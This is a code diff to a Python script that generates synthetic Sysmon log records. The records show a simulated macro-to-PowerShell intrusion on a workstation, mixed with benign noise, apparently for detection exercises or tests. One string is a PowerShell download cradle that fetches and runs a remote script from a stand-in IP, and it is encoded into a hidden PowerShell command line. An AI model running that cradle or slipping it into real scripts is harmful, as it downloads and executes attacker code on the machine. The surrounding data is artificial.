@@ -105,8 +105,45 @@ def windows_events() -> list[dict]:
     return ev
 
 
+def sysmon_events() -> list[dict]:
+    """The same WS-FIN-07 intrusion as seen by Sysmon, plus benign noise."""
+    base = datetime(2026, 11, 10, 9, 0, 0)
+    ev = []
+    host = "WS-FIN-07.corp.example"
+    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"
+
+    def add(minutes, event_id, **fields):
+        ts = base + timedelta(minutes=minutes)
+        fields = {"EventID": event_id, "Channel": "Microsoft-Windows-Sysmon/Operational",
+                  "Computer": host, "UtcTime": ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], **fields}
+        ev.append(fields)
+
+    # Benign: Word saving a document, OneDrive syncing, Edge browsing
+    add(5, 11, Image=word, TargetFilename="C:\\Users\\thandi\\Documents\\Q3 budget.docx", User="CORP\\thandi")
+    add(6, 3, Image="C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe", User="CORP\\thandi",
+        SourceIp="10.20.4.17", DestinationIp="192.0.2.200", DestinationPort=443, DestinationHostname="sync.example.net")
+    add(7, 1, Image="C:\\Windows\\System32\\cmd.exe", ParentImage="C:\\Windows\\explorer.exe",
+        CommandLine="cmd.exe /c ipconfig /all", User="CORP\\thandi")
+
+    # Malicious: invoice.docm macro -> PowerShell cradle -> download -> payload on disk
+    add(13.9, 11, Image=word, TargetFilename="C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", User="CORP\\thandi")
+    add(14, 1, Image=ps, ParentImage=word, User="CORP\\thandi",
+        CommandLine=f"powershell.exe -nop -w hidden -enc {ps_encode(cradle)}",
+        Hashes="SHA256=" + "0" * 64)
+    for i in range(3):
+        add(14.1 + i * 0.1, 3, Image=ps, User="CORP\\thandi", SourceIp="10.20.4.17",
+            DestinationIp="198.51.100.23", DestinationPort=80)
+    add(14.5, 11, Image=ps, TargetFilename="C:\\Users\\thandi\\AppData\\Local\\Temp\\update.exe", User="CORP\\thandi")
+    return ev
+
+
 def main() -> None:
     OUT.mkdir(exist_ok=True)
+    with (OUT / "sysmon.jsonl").open("w", encoding="utf-8") as fh:
+        for record in sysmon_events():
+            fh.write(json.dumps(record) + "\n")
     (OUT / "auth.log").write_text("\n".join(auth_log()) + "\n", encoding="utf-8")
     with (OUT / "windows_security.jsonl").open("w", encoding="utf-8") as fh:
         for record in windows_events():
